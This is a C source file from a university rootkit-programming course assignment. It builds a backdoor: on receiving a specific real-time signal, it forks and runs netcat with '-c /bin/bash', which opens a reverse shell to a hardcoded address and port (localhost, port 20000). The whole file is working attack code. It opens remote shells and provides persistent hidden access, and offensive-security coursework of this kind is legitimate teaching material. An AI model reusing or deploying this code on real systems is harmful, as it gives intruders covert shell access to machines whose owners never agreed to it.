
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 10                                                            */
/*                                                                             */
/*   Filename: remote_shell_provider.c                                         */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: January 2016                                                        */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/

#include <stdio.h>
#include <signal.h>

/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define SHOW_DEBUG_MESSAGES 1
#define PRINT(str) printf("remote_shell_provider: %s\n", (str))
#define DEBUG_PRINT(str) if (SHOW_DEBUG_MESSAGES) PRINT(str)
#define BASH_EXEC "/bin/bash"
#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT "20000"


/* Definition of global variables */
static int show_debug_messages;


/* Declaration of functions */
void signal_handler(int);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


int main(int argc, char **argv)
{
	char *exec_params[] = {
        "nc",
        "-c",
        BASH_EXEC,
		REMOTE_ADDR,
		REMOTE_PORT,
        NULL
    };

	signal(SIGRTMIN+2, signal_handler);

	while (1) {
		pause();

		switch (fork()) {
			case -1:
				DEBUG_PRINT("fork() failure");
			case  0:
				execvp(exec_params[0], exec_params);
				DEBUG_PRINT("execvp() failure");
			default:
				break;
		}

		if ((wait(NULL)) == -1)
			DEBUG_PRINT("wait() failure");
	}
}


void signal_handler(int signum)
{
	DEBUG_PRINT("received signal");
	signal(SIGRTMIN+2, signal_handler);

	return;
}
